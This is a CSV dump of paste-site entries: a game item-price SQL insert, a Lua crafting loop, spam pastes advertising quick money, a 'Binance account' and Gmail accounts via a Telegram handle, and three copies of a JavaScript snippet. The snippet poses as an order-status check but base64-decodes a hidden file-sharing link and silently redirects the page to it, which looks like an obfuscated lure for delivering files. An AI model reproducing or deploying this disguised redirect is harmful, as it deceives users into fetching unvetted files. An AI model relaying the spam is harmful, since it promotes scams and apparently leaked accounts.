id,title,username,language,date,content
yEh9EhUC,Untitled,Dharder,JavaScript,Saturday 22nd of March 2025 01:05:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/956/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gQMBRhVk,Make $1000 15-MINUTES (BEGINNER) 55,alrwellthisisdumb,JavaScript,Saturday 22nd of March 2025 01:04:25 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

Pak0V4cZ7c
"
nR0Cta8Y,Binance account FJ,alrwellthisisdumb,JavaScript,Saturday 22nd of March 2025 01:02:20 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

HlucR66TH6
"
Rn9Ei58Q,Вещи BFa x5 актуал 8.1(мифик) + от игроков,Sansuall,MySQL,Saturday 22nd of March 2025 01:02:01 AM CDT,"REPLACE INTO TItemPrice VALUES

-- Мифик Актуал 8.1
(165548, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165540, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165565, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165521, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165552, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165568, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165587, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165500, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165531, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165777, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165515, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165499, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165582, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165589, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165922, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165513, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165588, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165555, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165920, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165535, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165551, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165534, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165502, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165532, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165512, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165560, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165595, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165579, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165833, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165594, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165507, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165562, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165581, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165599, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(166418, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165550, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165834, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165517, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165514, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165919, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165569, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165586, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165549, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165533, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165921, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165519, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165501, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165584, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165598, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165522, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165830, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165508, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165543, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165497, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165924, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165572, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165825, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165580, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165596, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165537, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165578, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165577, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165523, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165832, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165536, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165558, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165498, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165597, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165567, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165819, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165506, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165601, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165923, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165528, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165557, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165603, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165556, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165546, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165602, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165590, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165822, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165574, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165515, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165499, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165582, 2, 1799, 'Y', 000, '4800,40,1537,4786', 0, 6),
(165589, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165922, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165513, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165588, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165555, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165525, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165920, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165535, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165551, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165534, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165548, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165540, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165565, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165521, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165552, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165568, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165516, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165587, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165500, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165531, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165503, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165818, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165591, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165538, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165820, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165541, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165561, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165504, 2, 1799, 'Y', 000, '4800,1808,1537,4786', 0, 6),
(165593, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165571, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165524, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165526, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165592, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165821, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165559, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165576, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165823, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165542, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165527, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165583, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165604, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165831, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165824, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165505, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165570, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165550, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165834, 2, 1799, 'Y', 000, '4824,1537,5419,4786', 0, 6),
(165517, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165514, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165919, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165569, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165586, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165549, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165533, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),
(165921, 2, 1799, 'Y', 000, '4824,1537,5421,4786', 0, 6),
(165519, 2, 1799, 'Y', 000, '4824,1537,5420,4786', 0, 6),
(165501, 2, 1799, 'Y', 000, '4800,1537,4786', 0, 6),

-- От игроков


(152169, 2, 201, 'Y', 000, '3612,1502,3528', 0, 6),
(152171, 2, 201, 'Y', 000, '3612,1502,3528', 0, 6),
(152166, 2, 201, 'Y', 000, '3612,1502,3528', 0, 6),
(152168, 2, 201, 'Y', 000, '3612,1502,3528', 0, 6),
(152006, 2, 201, 'Y', 000, '3612,1502,3528', 0, 6),
(152167, 2, 201, 'Y', 000, '3612,1502,3528', 0, 6),
(138330, 2, 201, 'Y', 000, '3518,1484,3528', 0, 6),
(138336, 2, 201, 'Y', 000, '3518,1484,3528', 0, 6),
(138366, 2, 201, 'Y', 000, '3518,1484,3528', 0, 6),
(138324, 2, 201, 'Y', 000, '3518,1484,3528', 0, 6),
(138327, 2, 201, 'Y', 000, '3518,1484,3528', 0, 6),
(140858, 2, 201, 'Y', 000, '3445,1482,3528', 0, 6),
(152423, 2, 201, 'Y', 000, '3612, 1502, 3528', 0, 6),
(152005, 2, 201, 'Y', 000, '3612, 1502, 3528', 0, 6),
(90053, 2, 125, 'Y', 000, '0', 0, 0),
(90049, 2, 125, 'Y', 000, '0', 0, 0),
(90056, 2, 125, 'Y', 000, '0', 0, 0),
(90055, 2, 125, 'Y', 000, '0', 0, 0),
(90054, 2, 125, 'Y', 000, '0', 0, 0),
(90052, 2, 125, 'Y', 000, '0', 0, 0),
(90051, 2, 125, 'Y', 000, '0', 0, 0),
(90050, 2, 125, 'Y', 000, '0', 0, 0),
(156691, 2, 125, 'Y', 000, '0', 0, 0),
(71982, 2, 125, 'Y', 000, '0', 0, 0),
(140872, 2, 201, 'Y', 000, '3446,1464,3528', 0, 4),
(140875, 2, 201, 'Y', 000, '3446,1464,3528', 0, 4),
(139219, 2, 201, 'Y', 000, '3379,1466,3527', 0, 4),
(138214, 2, 201, 'Y', 000, '3379,1466,3527', 0, 4),
(140890, 2, 201, 'Y', 000, '3520,1466,3528', 0, 4),
(38310, 2, 250, 'Y', 000, '0', 0, 0),
(32471, 2, 250, 'Y', 000, '0', 0, 0),
(49086, 2, 250, 'Y', 000, '0', 0, 0),
(51534, 2, 250, 'Y', 000, '0', 0, 0),
(112930, 2, 125, 'Y', 000, '0', 0, 0),
(104707, 2, 125, 'Y', 000, '0', 0, 0),
(104685, 2, 125, 'Y', 000, '0', 0, 0),
(112931, 2, 125, 'Y', 000, '0', 0, 0),
(112927, 2, 125, 'Y', 000, '0', 0, 0),
(104760, 2, 125, 'Y', 000, '0', 0, 0),
(22669, 2, 125, 'Y', 000, '0', 0, 0),
(43586, 2, 125, 'Y', 000, '0', 0, 0),
(22940, 2, 125, 'Y', 000, '0', 0, 0),
(22671, 2, 125, 'Y', 000, '0', 0, 0),
(23019, 2, 125, 'Y', 000, '0', 0, 0),
(22699, 2, 125, 'Y', 000, '0', 0, 0),
(43587, 2, 125, 'Y', 000, '0', 0, 0),
(22670, 2, 125, 'Y', 000, '0', 0, 0),
(43588, 2, 125, 'Y', 000, '0', 0, 0),

-- Лутбоксы актуала
(300108, 2, 650, 'Y', 000, '0', 0, 0),
(300109, 2, 800, 'Y', 000, '0', 0, 0),
(300109, 2, 1100, 'Y', 000, '0', 0, 0);

"
nLzNYs5L,EARN $900 INSTANTLY 2025 OL,alrwellthisisdumb,JavaScript,Saturday 22nd of March 2025 01:00:17 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

5S4PX8HFmK
"
hXv14jz8,Untitled,Dharder,JavaScript,Saturday 22nd of March 2025 12:59:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/178/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KeCZ0g1Y,Random Gmail Acc JT,alrwellthisisdumb,JavaScript,Saturday 22nd of March 2025 12:58:13 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

nXHxXgEsxx
"
3PCFw1Bf,Make $1000 15-MINUTES (BEGINNER) 55,alrwellthisisdumb,JavaScript,Saturday 22nd of March 2025 12:56:07 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

13xojEc7e7
"
b61Q7dYK,keepstewcrafting,Roar337,Lua,Saturday 22nd of March 2025 12:54:36 AM CDT,"local me = peripheral.find('meBridge')

local toCraft = {name=""avaritia:ultimate_stew"", count=1}

while true do
	if not me.isItemCrafting(toCraft) then
		me.craftItem(toCraft)
		os.sleep(3)
	end
end"
1UU3r2qw,Untitled,Dharder,JavaScript,Saturday 22nd of March 2025 12:54:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/727/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
